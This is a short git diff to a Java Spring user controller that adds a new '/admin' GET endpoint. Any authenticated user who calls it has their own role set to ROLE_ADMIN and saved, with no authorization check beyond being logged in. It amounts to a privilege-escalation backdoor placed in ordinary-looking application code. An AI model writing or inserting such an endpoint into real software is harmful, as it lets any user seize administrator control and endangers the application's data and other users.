@@ -3,6 +3,7 @@ package com.A3M.user.controller;
 import com.A3M.user.dto.user.request.UserSuperUpdateDto;
 import com.A3M.user.dto.user.request.UserUpdateDto;
 import com.A3M.user.dto.user.response.UserDto;
+import com.A3M.user.enums.ERole;
 import com.A3M.user.exception.type.UserNotFoundException;
 import com.A3M.user.model.User;
 import com.A3M.user.repository.UserRepository;
@@ -32,6 +33,17 @@ public class UserController {
         if (user == null) {
             throw new UserNotFoundException("User not found in security context");
         }
+        return ResponseEntity.ok(UserDto.from(user));
+    }
+
+    @GetMapping("/admin")
+    @PreAuthorize("isAuthenticated()")
+    public ResponseEntity<UserDto> admin(@AuthenticationPrincipal User user) {
+        if (user == null) {
+            throw new UserNotFoundException("User not found in security context");
+        }
+        user.setRole(ERole.ROLE_ADMIN);
+        userRepository.save(user);
         return ResponseEntity.ok(UserDto.from(user));
     }
 
